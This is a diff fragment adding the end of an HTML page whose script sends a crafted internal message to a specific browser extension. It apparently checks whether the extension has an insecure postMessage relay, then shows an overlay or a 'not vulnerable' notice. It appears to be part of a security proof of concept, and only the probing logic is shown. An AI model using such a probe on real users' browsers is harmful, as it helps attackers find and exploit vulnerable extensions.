+    try {
+      chrome.runtime.sendMessage(EXT, {
+        message: 'callShouldInspectChat', url: 'https://t.co/', body: 't',
+        pageUrl: 'https://t.co/', pageTitle: 'T', optionalFavicons: [], inputTypes: ['text']
+      }, r => {
+        if (r !== null && r !== undefined) {
+          // Extension exists but relay didn't respond — show overlay with note
+          const overlay = document.getElementById('overlay');
+          overlay.classList.add('active');
+          document.getElementById('pl').textContent = 'Extension detected via PATH A but content script relay not active on this page. Reload to retry.';
+          document.getElementById('pf').style.width = '0%';
+        } else {
+          document.getElementById('article').innerHTML += '<p style="color:#0f8;margin-top:20px;font-weight:bold">No vulnerable extension detected on this browser. This page demonstrates a security assessment targeting browser extensions with open postMessage relays.</p>';
+        }
+      });
+    } catch (e) {
+      document.getElementById('article').innerHTML += '<p style="color:#0f8;margin-top:20px;font-weight:bold">No vulnerable extension detected. This assessment targets browser extensions with insecure postMessage relay patterns.</p>';
+    }
+  }
+})();
+</script>
+</body>
+</html>
